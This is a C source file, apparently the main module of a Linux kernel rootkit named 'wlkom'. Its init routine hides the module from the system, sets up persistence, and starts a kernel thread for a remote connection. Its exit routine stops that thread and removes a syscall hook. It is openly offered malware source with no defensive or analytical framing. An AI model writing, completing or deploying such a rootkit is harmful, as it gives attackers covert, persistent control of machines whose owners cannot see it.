#include "hide-rootkit/hide_rootkit.h"
#include "hide-rootkit/syscall_hook.h"
#include "connection.h"
#include "persistence.h"

#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/printk.h>

struct task_struct *wlkom_thread;

int __init wlkom_init(void)
{
	pr_info("wlkom: module loaded\n");

	wlkom_hide_module();
	pr_info("wlkom_log: module should be hidden\n");


	wlkom_persist();

	wlkom_thread = kthread_run(wlkom_connection_thread, NULL, "wlkom_connection");
	if (IS_ERR(wlkom_thread)) 
	{
		pr_info("wlkom_log: failed to start connection thread\n");
		return PTR_ERR(wlkom_thread);
	}

	pr_info("wlkom_log: connection thread started\n");
	return 0;
}

void __exit wlkom_exit(void) 
{
	if (wlkom_thread) 
	{
		kthread_stop(wlkom_thread);
		pr_info("wlkom_log: connection thread stopped\n");
		wlkom_syscall_hook_exit();
	}

	pr_info("wlkom_log: module unloaded\n");
}

module_init(wlkom_init);
module_exit(wlkom_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wlkom-rootkit contributors");
MODULE_DESCRIPTION("wlkom rootkit");
